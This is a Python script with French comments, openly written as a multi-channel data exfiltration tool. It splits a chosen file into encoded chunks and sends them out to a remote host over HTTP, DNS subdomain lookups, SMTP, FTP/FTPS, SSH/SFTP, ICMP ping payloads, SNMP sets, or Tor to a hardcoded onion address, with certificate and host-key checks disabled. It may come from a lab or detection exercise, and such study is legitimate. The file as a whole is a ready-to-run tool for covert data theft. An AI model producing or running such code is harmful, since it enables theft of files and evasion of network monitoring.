#!/usr/bin/env python3
import os
import sys
import ssl
import time
import uuid
import aioftp
import socket
import signal
import pathlib
import asyncio
import smtplib
import requests
import asyncssh
import platform
import subprocess
import http.client
import dns.resolver
from tqdm import tqdm
from random import random
from pythonping import ping
from ftplib import FTP, FTP_TLS
from email.mime.text import MIMEText
from scapy.all import IP, ICMP, send
from pysnmp.proto.rfc1902 import OctetString
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from base64 import b32encode, b32decode, urlsafe_b64encode, urlsafe_b64decode
from pysnmp.hlapi.v3arch.asyncio import SnmpEngine, CommunityData, UdpTransportTarget, ContextData, ObjectType, ObjectIdentity, set_cmd

# ========================
# SIGNALISATION
# ========================

def signaler_serveur(destination, fichier, mode):
    SIGNAL_PORT = 9999
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((destination, SIGNAL_PORT))
            message = f"{fichier} {mode}"
            s.sendall(message.encode())
        return 0
    except Exception as e:
        print(f"[!] Il y a une erreur : {e}")
        return 84

# ========================
# FONCTIONS UTILITAIRES
# ========================

def diviser_fichier(nom_fichier, taille_partie, mode):
    parties = []
    with open(nom_fichier, "rb") as fichier:
        while True:
            partie = fichier.read(taille_partie)
            if not partie:
                break
            if mode == "dns":
                tmp = b32encode(partie).decode().lower()
            elif mode == "tor":
                tmp = partie
            else:
                tmp = urlsafe_b64encode(partie).decode()
            parties.append(tmp)
    return parties

# ========================
# EXFILTRATION SMTP
# ========================

def envoyer_paquets_smtp(destination, parties):
    port = 1025
    to_addr = 'destinataire@localhost'

    for i, partie in enumerate(tqdm(parties, desc="Envoi SMTP")):
        time.sleep(0.5)
        filepath = f"chunk_{uuid.uuid4().hex[:8]}.txt"

        with open(filepath, "w") as fw:
            fw.write(partie)

        msg = MIMEMultipart()
        msg['To'] = to_addr
        msg['Subject'] = f"Exfiltration SMTP - Partie {i+1}"

        try:
            with open(filepath, 'rb') as f:
                part = MIMEApplication(f.read(), Name=filepath)
                part['Content-Disposition'] = f'attachment; filename="{filepath}"'
                msg.attach(part)
        except Exception as e:
            print(f"⚠️ Erreur en joignant {filepath} : {e}")
            continue

        try:
            with smtplib.SMTP(destination, port) as server:
                server.send_message(msg)
        except Exception as e:
            print(f"❌ Erreur d’envoi SMTP : {e}")

        os.remove(filepath)

# ========================
# EXFILTRATION DNS
# ========================

def envoyer_paquets_dns(destination, parties, base_domain="exfil.domain.com"):
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [destination]

    for i, part in enumerate(tqdm(parties, desc="Envoi DNS")):
        domaine = f"{part}.{base_domain}"

        try:
            resolver.resolve(domaine, "A")
        except Exception as e:
            print(f"[!] Erreur DNS pour {domaine} : {e}")

        time.sleep(0.5)

# ========================
# EXFILTRATION HTTP
# ========================

def envoyer_paquets_http(destination, parties):
    ip = destination
    port = 80
    path = "/exfil"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    conn = http.client.HTTPConnection(ip, port, timeout=5)

    for i, part in enumerate(tqdm(parties, desc="Envoi HTTP")):
        time.sleep(1)
        payload = f"chunk={part}"
        conn.request("POST", path, payload, headers)
        #res = conn.getresponse()
        #res.read()
    conn.close()

# ========================
# EXFILTRATION FTP
# ========================

def envoyer_paquets_ftp(destination, parties):
    port = 21
    username = "user"
    password = "password"

    try:
        ftp = FTP()
        ftp.connect(destination, port)
        ftp.login(username, password)
        print("[*] Connecté au serveur FTP")
    except Exception as e:
        print(f"[!] Erreur connexion FTP : {e}")
        return

    for i, part in enumerate(tqdm(parties, desc="Envoi FTP")):
        time.sleep(1)
        filename = f"chunk_{uuid.uuid4().hex[:8]}.txt"
        with open(filename, "w") as f:
            f.write(part)

        try:
            with open(filename, "rb") as f:
                ftp.storbinary(f"STOR {filename}", f)
        except Exception as e:
            print(f"[!] Erreur upload FTP : {e}")

        os.remove(filename)

    ftp.quit()
    print("[*] FTP terminé")

# ========================
# EXFILTRATION FTPS
# ========================

def envoyer_paquets_ftps(destination, parties):
    port = 2121
    username = "user"
    password = "password"

    try:
        # FTPS explicit mode with TLSv1.2
        ftps = FTP_TLS()
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        ftps.ssl_version = ssl.PROTOCOL_TLSv1_2
        ftps.ssl_context = context

        ftps.connect(destination, port)
        ftps.auth()
        ftps.login(username, password)
        ftps.prot_p()
        print("[*] Connected to FTPS server with TLS")

    except Exception as e:
        print(f"[!] FTPS connection error: {e}")
        return

    for part in tqdm(parties, desc="Envoi FTPS"):
        filename = f"chunk_{uuid.uuid4().hex[:8]}.txt"
        with open(filename, "wb") as f:
            f.write(part.encode())

        try:
            with open(filename, "rb") as f:
                ftps.storbinary(f"STOR {filename}", f)
        except Exception as e:
            print(f"[!] FTPS upload error: {e}")
        finally:
            os.remove(filename)
        time.sleep(1)

    ftps.quit()
    print("[*] FTPS upload completed")

# ========================
# EXFILTRATION SSH
# ========================

async def send_data(host, port, username, key_file, message):
    """Send data via SSH."""
    async with asyncssh.connect(
        host,
        port=port,
        username=username,
        client_keys=[key_file],
        known_hosts=None
    ) as conn:
        async with conn.create_process() as process:
            process.stdin.write(message + '\n')
            await process.stdin.drain()

async def envoyer_paquets_ssh(destination, parties):
    port = 22222
    username = "user"
    key_file = "keys/client_key"

    for i, part in enumerate(tqdm(parties, desc="Envoi SSH")):
        await asyncio.sleep(0.5)
        try:
            await send_data(destination, port, username, key_file, part)
        except Exception as e:
            print(f"[!] Erreur d’envoi SSH : {e}")

# ========================
# EXFILTRATION SFTP
# ========================

async def send_sftp_file(host, port, username, key_file, filename, data):
    """Crée un fichier temporaire, l'envoie via SFTP, puis le supprime."""
    try:
        async with asyncssh.connect(
            host,
            port=port,
            username=username,
            client_keys=[key_file],
            known_hosts=None
        ) as conn:
            async with conn.start_sftp_client() as sftp:
                with open(filename, "w") as f:
                    f.write(data)
                await sftp.put(filename, filename)
                os.remove(filename)
    except Exception as e:
        print(f"[!] Erreur d’envoi SFTP pour {filename} : {e}")

async def envoyer_paquets_sftp(destination, parties):
    port = 2222
    username = "user"
    key_file = "keys/client_key"

    loop = asyncio.get_event_loop()

    for i, part in enumerate(tqdm(parties, desc="Envoi SFTP")):
        filename = f"chunk_{uuid.uuid4().hex[:8]}.txt"
        time.sleep(0.5)
        try:
            await send_sftp_file(destination, port, username, key_file, filename, part)
        except Exception as e:
            print(f"[!] Erreur SFTP : {e}")

# ========================
# EXFILTRATION ICMP
# ========================

def envoyer_paquets_icmp(destination, parties, delai: float = 0.02):
    """
    Envoie des données via ICMP (ping) vers une destination IP.
    Chaque partie du fichier est envoyée dans un paquet ICMP.
    """
    total_parties = len(parties)
    print(f"Envoi de {total_parties} paquets vers {destination}")

    for i, partie in enumerate(tqdm(parties, desc="Envoi des paquets", ncols=100)):
        ping(destination, count=1, payload=partie.encode())
        time.sleep(delai)

    print("\nTransmission terminée.")

# ========================
# EXFILTRATION SNMP
# ========================

async def envoyer_paquets_snmp(destination, parties, delai: float = 0.002):
    engine = SnmpEngine()
    with open("../exfiltration-main/pas_ouf/Wireshark-4.4.8-x64.exe", "rb") as f:
        for idx, chunk in enumerate(tqdm(parties, desc="Envoi des paquets")):
            err_ind, err_stat, _, _ = await set_cmd(
                engine,
                CommunityData("public", mpModel=1),
                await UdpTransportTarget.create((destination, 16100), timeout=10, retries=1),
                ContextData(),
                ObjectType(
                    ObjectIdentity("SNMPv2-MIB", "sysLocation", 0),
                    OctetString(chunk)
                )
            )
            if err_ind or err_stat:
                print("Error:", err_ind or err_stat.prettyPrint())
                return
            await asyncio.sleep(delai)
    print("Done sending file in chunks.")
    engine.close_dispatcher()

# ========================
# EXFILTRATION TOR (HTTP)
# ========================

ONION_ADDR = "uiarfeveadqaj3frrwlqomhgoywfdlujhw65jnzsyku7oqdlz4rwwnyd.onion"
TORRC_PATH = "/etc/tor/torrc"

def envoyer_paquets_tor(destination, parties, delai: float = 2):
    system = platform.system()
    
    if system == "Linux":
        process = subprocess.Popen(("sudo", "-u", "debian-tor", "tor", "-f", TORRC_PATH))
        print("Waiting for Tor to bootstrap...")
        time.sleep(10)  # pour laisser le temps à Tor de se connecter
    
    elif system == "Windows":
        tor_path = pathlib.Path("../tor/tor.exe")
        if not tor_path.exists():
            print("Tor executable not found at ../tor/tor.exe")
            return
        process = subprocess.Popen((str(tor_path), "-f", "../tor/torrc"))
        print("Waiting for Tor to bootstrap...")
        time.sleep(10)
    
    destination = "useless with tor but idc i'll keep it"

    proxies = {
        "http":  "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050"
    }

    for i, part in enumerate(tqdm(parties, desc="Envoi TOR")):
        time.sleep(delai)
        filename = f"chunk_{uuid.uuid4().hex[:8]}.txt"
        with open(filename, "wb") as f:
            f.write(part)

        try:
            with open(filename, "rb") as f:
                files = {"file": ("test.txt", f)}
                url = f"http://{ONION_ADDR}/upload"
                resp = requests.post(url, files=files, proxies=proxies, timeout=60)
                print("Server response:", resp.json())
        except requests.exceptions.RequestException as e:
            print("Error:", e)
        os.remove(filename)
    process.send_signal(signal.SIGINT)
    print("Tor stopped.")

# ========================
# MAIN
# ========================

async def main():
    modes = ("http", "dns", "smtp", "ftp", "ssh", "icmp", "sftp", "ftps", "snmp", "tor")
    tailles = (3000000000, 5, 17250000, 2000000000, 1500000, 1500, 2000000000, 2000000000, 185, 21000000)

    if len(sys.argv) < 4 or sys.argv[3] not in modes or len(sys.argv[2].split(".")) != 4:
        print(f"Utilisation : {sys.argv[0]} <Nom du fichier> <Adresse IP de destination> <Mode {modes}>")
        sys.exit(84)

    nom_fichier = sys.argv[1]
    destination = sys.argv[2]
    mode = sys.argv[3]

    if not os.path.isfile(nom_fichier):
        print(f"Erreur : le fichier {nom_fichier} n'existe pas.")
        sys.exit(84)

    if signaler_serveur(destination, nom_fichier, mode) != 0:
        sys.exit(84)

    print(f"[+] Début de l’exfiltration du fichier {nom_fichier} vers {destination} en mode {mode}")

    parties = diviser_fichier(nom_fichier, tailles[modes.index(mode)], mode)

    if mode == "http":
        envoyer_paquets_http(destination, parties)
    elif mode == "dns":
        envoyer_paquets_dns(destination, parties)
    elif mode == "smtp":
        envoyer_paquets_smtp(destination, parties)
    elif mode == "ftp":
        envoyer_paquets_ftp(destination, parties)
    elif mode == "ftps":
        envoyer_paquets_ftps(destination, parties)
    elif mode == "ssh":
        await envoyer_paquets_ssh(destination, parties)
    elif mode == "sftp":
        await envoyer_paquets_sftp(destination, parties)
    elif mode == "icmp":
        envoyer_paquets_icmp(destination, parties)
    elif mode == "snmp":
        await envoyer_paquets_snmp(destination, parties)
    elif mode == "tor":
        envoyer_paquets_tor(destination, parties)

if __name__ == "__main__":
    asyncio.run(main())
